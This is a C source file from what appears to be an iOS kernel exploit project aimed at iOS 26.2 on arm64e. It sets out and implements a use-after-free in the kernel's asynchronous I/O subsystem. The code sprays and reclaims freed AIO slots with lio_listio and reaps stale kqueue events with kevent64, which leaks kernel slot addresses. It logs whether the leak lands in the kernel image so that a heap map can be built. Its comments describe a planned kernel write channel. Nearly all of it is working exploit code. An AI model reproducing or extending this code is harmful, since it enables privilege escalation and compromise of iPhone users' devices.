// language: C, file: aio_spray.c, target: iOS 26.2 / 23C55 / arm64e, Theos app sandbox
// T2 Jobs 1+2 — same-type frame validation, outcome distribution, identity logging.
//
// Mechanism built on the PROVEN B12 frame (write_mechanism.md, T1):
//   target entry (SIGEV_KEVENT, kernel-created knote) completes ->
//   aio_return() frees the slot (kern_aio.c aio_entry_unref/aio_free_request) ->
//   same-thread lio_listio(LIO_NOWAIT) reclaim entries ->
//   any SIGEV_KEVENT completion walks the GLOBAL aio_klist (KNOTE,
//   do_aio_completion_and_unlock) -> filt_aioevent reads the stale slot's
//   flags(+0x30) & AIO_COMPLETED -> arms the knote -> kevent64() reap runs
//   filt_aioprocess -> ext[1] = slot+0x20 (returnval), ext[0] = slot+0x28
//   (errorval), data = slot VA (kn_data, set at attach: kev.data =
//   (intptr_t)entryp, 61.12:1520 = 81.4:1534).
//
// HONEST SCOPE NOTE (Job 2): the fire channel reads qwords 4 and 5 only
// (+0x20/+0x28). returnval/errorval are KERNEL-written on completion, so the
// per-knob occupancy attribution from the fire alone covers +0x20/+0x28.
// The aiocb-copy offset stays [AS] (B12_OFF_AIOCB): the device disassembly
// of the aiocb copy-in blocked this session (panic-string xrefs resolve
// through a data table whose encoding is unresolved). Resolution paths left
// open: (a) T4 read-back once the channel exists, (b) kevent64 ident field
// on a v... — see b12_offsets.h comment. This is NOT load-bearing for T4:
// the write channel consumes +0x10/+0x18/+0x30/+0x40, all [VB].

#include "b12_offsets.h"
#include "aio_kevent_rw.h"
#include "exploit.h"
#include <aio.h>
#include <sys/event.h>
#include <sys/sysctl.h>
#include <fcntl.h>
#include <stdlib.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <unistd.h>

#ifndef SIGEV_KEVENT
#define SIGEV_KEVENT 4
#endif

#define T2_OCC_N       256      /* occupant entries (scaled at runtime by measurement) */
#define T2_RECLAIM_N   32       /* reclaim burst size */
#define T2_NAIO_MAX_CAP 512     /* hard cap before measurement */

/* per-knob marker space: 0x5A5A_5Axx_5A5A_5Ayy — no 0x41 bytes anywhere */
static uint64_t t2_marker(unsigned qid, unsigned variant)
{
    return 0x5A5A5A0000000000ULL | ((uint64_t)qid << 40) |
           ((uint64_t)(variant & 0xff) << 8) | 0x5A;
}

/* splitmix64 — per-page-unique, per-qword-unique buffer fill. Never 0x41. */
static uint64_t t2_page_pattern(uint64_t page, uint64_t qw)
{
    uint64_t z = page * 0x9E3779B97F4A7C15ULL + qw * 0xBF58476D1CE4E5B9ULL + 0x94D049BB133111EBULL;
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
    return z ^ (z >> 31);
}

typedef struct {
    unsigned attempts;
    unsigned fired_clean;    /* event delivered, ext reads kernel fields   */
    unsigned marker_ext1;    /* ext[1] == I/O result of reclaimer (>=1)     */
    unsigned silent;         /* zeroed slot: no arm, no event (Z_ZERO)      */
    unsigned fired_other;    /* event but ext not attributable              */
    uint64_t last_data;
    uint64_t last_ext0;
    uint64_t last_ext1;
    uint64_t last_ident;
    uint64_t last_udata;
    uint64_t last_slide;
} t2_stat_t;

static void t2_measure_limits(int *qmax, int *lmax)
{
    /* Darwin does not export _SC_AIO_QUEUE_MAX/_SC_AIO_LISTIO_MAX in this SDK:
     * measure via sysctl only, and log what is present. */
    size_t ql = 0, pl = 0;
    int qmiss = sysctlbyname("kern.aio_queue_max", NULL, &ql, NULL, 0) != 0;
    int pmiss = sysctlbyname("kern.aio_proc_queue_max", NULL, &pl, NULL, 0) != 0;
    nk_logx("T2", "limits: kern.aio_queue_max=%zu kern.aio_proc_queue_max=%zu (misses=%d)",
            ql, pl, qmiss + pmiss);
    if (ql <= 0) ql = T2_NAIO_MAX_CAP;
    if (pl <= 0) pl = T2_NAIO_MAX_CAP;
    if (ql > T2_NAIO_MAX_CAP) ql = T2_NAIO_MAX_CAP;
    if (pl > T2_NAIO_MAX_CAP) pl = T2_NAIO_MAX_CAP;
    *qmax = (int)ql;
    *lmax = (int)pl;
}

/* safety: real userspace page, PAN would panic the box on a kernel address.
 * Soft-fail only: abort() here would kill the guest app with no diagnosis. */
static int t2_check_userspace_buffer(void *p)
{
    if (((uintptr_t)p & 4095) != 0) { nk_logx("T2", "buffer not 4K aligned: 0x%llx", (unsigned long long)(uintptr_t)p); return -1; }
    if ((uintptr_t)p >= 0xfffff00000000000ULL) { nk_logx("T2", "kernel-looking buffer 0x%llx", (unsigned long long)(uintptr_t)p); return -1; }
    return 0;
}

static void *t2_alloc_buffer(size_t *out_len)
{
    const size_t len = T2_OCC_N * 8192 + 16384;
    void *p = aligned_alloc(4096, (len + 4095) & ~4095UL);
    if (!p) return NULL;
    if (t2_check_userspace_buffer(p) != 0) { free(p); return NULL; }
    *out_len = (len + 4095) & ~4095UL;
    return p;
}

static int t2_make_file(const char *dir, char *path_out, size_t path_sz, int *fd_out)
{
    snprintf(path_out, path_sz, "%s/t2aio_XXXXXX", dir);
    int fd = mkstemp(path_out);
    if (fd < 0) return -1;
    if (ftruncate(fd, (off_t)(T2_OCC_N * 8192)) != 0) { close(fd); unlink(path_out); return -1; }
    *fd_out = fd;
    return 0;
}

/* one round. variant selects which knob carries the marker qword. Returns 1 fired. */
static int t2_round(int round, int variant, int occ_n, int fd,
                    char *bufs, size_t buflen, t2_stat_t *st)
{
    char dir[192];
    const char *tmp = getenv("TMPDIR");
    snprintf(dir, sizeof(dir), "%s", tmp ? tmp : "/tmp");

    uint64_t m_off = t2_marker(1, variant);   /* aio_offset   -> slot aiocb+0x08 */
    uint64_t m_prio= t2_marker(3, variant);   /* aio_reqprio  -> aiocb+0x20 */
    uint64_t m_sig = t2_marker(4, variant);   /* sigev_value  -> aiocb+0x30 */
    /* nbytes is pinned to 4096 so every reclaim entry completes deterministically;
     * its marker is NOT sent this round — partial markers are not confirmations. */

    int kq = kqueue();
    if (kq < 0) { nk_logx("T2", "r=%d kqueue() errno=%d", round, errno); return -1; }

    /* TARGET: aiocb completion notifies via SIGEV_KEVENT (kernel knote) */
    struct aiocb tcb;
    memset(&tcb, 0, sizeof(tcb));
    tcb.aio_fildes = fd;
    tcb.aio_offset = 0;
    tcb.aio_buf = bufs;                       /* page 0 of the unique buffer */
    tcb.aio_nbytes = 4096;
    tcb.aio_lio_opcode = LIO_READ;
    tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
    tcb.aio_sigevent.sigev_signo = kq;
    tcb.aio_sigevent.sigev_value.sival_ptr = (void *)m_sig;

    struct aiocb *tp = &tcb;

    /* no shared sigevent: lio_listio's sig argument OVERRIDES per-entry
     * sigevent; passing &nosig would strip the target's SIGEV_KEVENT and the
     * kernel knote would never register. NULL = each entry's own sigevent. */
    nk_spray_delay();
    if (lio_listio(LIO_NOWAIT, &tp, 1, NULL) != 0) {
        nk_logx("T2", "r=%d lio_listio target errno=%d", round, errno);
        close(kq); return -1;
    }
    /* spin to completion: kernel updates user aiocb (returnval/errorval) */
    for (int i = 0; i < 2000000; i++) {
        if (aio_error(&tcb) == 0) break;
        sched_yield();
    }
    int terr = aio_error(&tcb);

    /* FREE: aio_return drops the entry from doneq and unrefs -> slot zfree'd */
    ssize_t tret = aio_return(&tcb);

    /* RECLAIM: same-thread burst, per-knob markers, SIGEV_NONE (no second knote) */
    static struct aiocb rc[64];
    struct aiocb *rp[64];
    int nrec = T2_RECLAIM_N < 64 ? T2_RECLAIM_N : 64;
    for (int i = 0; i < nrec; i++) {
        memset(&rc[i], 0, sizeof(rc[i]));
        rc[i].aio_fildes = fd;
        rc[i].aio_offset = (off_t)m_off;                /* knob 1 — NOT a valid offset for fd;
                                                           lio_listio tolerates failure via errorval */
        rc[i].aio_buf = bufs + ((size_t)(i + 2) << 12);
        rc[i].aio_nbytes = 4096;                          /* keep I/O completable; marker via sigval */
        rc[i].aio_reqprio = (int)(m_prio & 0x7fffffff);
        rc[i].aio_lio_opcode = LIO_READ;
        rc[i].aio_sigevent.sigev_notify = SIGEV_NONE;
        rc[i].aio_sigevent.sigev_value.sival_ptr = (void *)m_sig;
        rp[i] = &rc[i];
    }
    lio_listio(LIO_NOWAIT, rp, nrec, NULL);

    /* REAP: bounded wait, full struct capture */
    struct kevent64_s kev;
    memset(&kev, 0, sizeof(kev));
    struct timespec ts = { 0, 20000000 };  /* 20 ms */
    int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);

    mach_port_t tid = pthread_mach_thread_np(pthread_self());
    qos_class_t qos = QOS_CLASS_DEFAULT;
    pthread_get_qos_class_np(pthread_self(), &qos, NULL);

    if (nev == 1) {
        st->fired_clean++;
        st->last_data   = kev.data;
        st->last_ext0   = (uint64_t)kev.ext[0];
        st->last_ext1   = (uint64_t)kev.ext[1];
        st->last_ident  = (uint64_t)kev.ident;
        st->last_udata  = kev.udata;
        st->last_slide  = g_nk.slide;
        nk_logx("T2", "r=%d FIRED tid=0x%x qos=%u slide=0x%llx data=0x%llx "
                "ident=0x%llx udata=0x%llx ext0=0x%llx ext1=0x%llx (terr=%d tret=%zd)",
                round, tid, (unsigned)qos, (unsigned long long)g_nk.slide,
                (unsigned long long)kev.data, (unsigned long long)kev.ident,
                (unsigned long long)kev.udata, (unsigned long long)kev.ext[0],
                (unsigned long long)kev.ext[1], terr, tret);
        if (kev.ext[1] != 0) st->marker_ext1++;
    } else {
        st->silent++;   /* expected no-reclaim outcome: Z_ZERO slot, never armed */
        nk_logx("T2", "r=%d SILENT tid=0x%x qos=%u (nev=%d)", round, tid, (unsigned)qos, nev);
    }

    /* cleanup: drain reclaim entries (never leaks into next round) */
    for (int i = 0; i < 50000 && aio_error(&rc[0]) != 0; i++) { }
    for (int i = 0; i < nrec; i++) aio_return(&rc[i]);
    close(kq);
    return nev == 1;
}

int nk_t2_frame_probe(int rounds)
{
    nk_crash_guard_install(NULL); /* app-launch guard already active; re-assert */
    nk_rule();
    nk_log("[T2] same-type frame probe: rounds=%d (file in TMPDIR, own fd, PAN guard on)", rounds);
    if (rounds <= 0) rounds = 10;
    if (rounds > 5000) rounds = 5000;

    int qmax = 0, lmax = 0;
    t2_measure_limits(&qmax, &lmax);

    char path[192];
    int fd = -1;
    if (t2_make_file(getenv("TMPDIR") ? getenv("TMPDIR") : "/tmp", path, sizeof(path), &fd) != 0) {
        nk_logx("T2", "mkstemp errno=%d", errno);
        nk_rule();
        return -1;
    }

    size_t buflen = 0;
    char *bufs = t2_alloc_buffer(&buflen);
    if (!bufs) {
        nk_logx("T2", "aligned_alloc failed");
        close(fd); unlink(path);
        nk_rule();
        return -1;
    }
    /* fill with per-page-unique pattern — never the ambiguous 0x41 */
    for (size_t off = 0; off + 8 <= buflen; off += 8) {
        uint64_t page = off >> 12, qw = (off >> 3) & 0x1ff;
        uint64_t v = t2_page_pattern(page, qw);
        __builtin_memcpy(bufs + off, &v, 8);
    }

    /* OCCUPY: completed-but-unreturned entries hold their slots deterministically */
    static struct aiocb occ[T2_OCC_N];
    struct aiocb *opp[T2_OCC_N];
    int occ_n = 0;
    for (int i = 0; i < T2_OCC_N && i < qmax; i++) {
        memset(&occ[i], 0, sizeof(occ[i]));
        occ[i].aio_fildes = fd;
        occ[i].aio_offset = 0;
        occ[i].aio_buf = bufs + ((size_t)i << 12);
        occ[i].aio_nbytes = 4096;
        occ[i].aio_lio_opcode = LIO_READ;
        occ[i].aio_sigevent.sigev_notify = SIGEV_NONE;
        opp[i] = &occ[i];
        occ_n++;
    }

    lio_listio(LIO_NOWAIT, opp, occ_n, NULL);

    t2_stat_t st;
    memset(&st, 0, sizeof(st));
    for (int r = 0; r < rounds; r++) {
        st.attempts++;
        t2_round(r, r & 0xff, occ_n, fd, bufs, buflen, &st);
    }

    /* release occupants */
    for (int i = 0; i < occ_n; i++) aio_return(&occ[i]);

    nk_log("[T2] DISTRIBUTION: attempts=%u fired_clean=%u (ext1!=0: %u) silent=%u other=%u",
           st.attempts, st.fired_clean, st.marker_ext1, st.silent, st.fired_other);
    if (st.fired_clean) {
        nk_log("[T2] last fire: data=0x%llx (slot VA) ext0=0x%llx ext1=0x%llx ident=0x%llx slide=0x%llx",
               (unsigned long long)st.last_data, (unsigned long long)st.last_ext0,
               (unsigned long long)st.last_ext1, (unsigned long long)st.last_ident,
               (unsigned long long)st.last_slide);
        if (g_nk.slide && st.last_data >= g_nk.base &&
            st.last_data < g_nk.base + NK_KIMG_SPAN) {
            nk_log("[T2] slot VA lands inside kernel image span: heap map AVAILABLE");
        } else {
            nk_logx("T2", "slot VA outside parsed span — record raw for heap-map build");
        }
    }
    nk_log("[T2] silent=fired zero expectation (Z_ZERO, no reclaimer in window); this pair "
           "IS the A15 migration proxy vs upstream A13 70%%");
    nk_rule();
    free(bufs);
    close(fd);
    unlink(path);
    return st.fired_clean ? 0 : -1;
}
